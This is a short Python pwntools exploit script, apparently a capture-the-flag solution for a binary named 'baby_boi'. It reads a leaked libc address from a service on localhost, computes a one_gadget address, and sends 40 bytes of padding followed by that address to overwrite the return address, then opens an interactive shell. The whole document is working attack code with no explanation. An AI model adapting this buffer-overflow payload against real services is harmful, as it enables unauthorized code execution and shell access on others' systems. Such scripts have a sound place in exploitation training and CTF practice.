from pwn import *

# context.terminal = ["termite", "-e"]

context.log_level = 'debug'
# r = process("./baby_boi")
r = remote("localhost", 12312)

r.recvuntil(":")
leak = int(r.recvuntil("\n"), 16)

one_gadget = 0x4F2C5
system_off = 0x00064E80

libc_base = leak - system_off
addr = libc_base + one_gadget

print(hex(addr))


r.sendline("i" * 40 + p64(addr))

r.interactive()
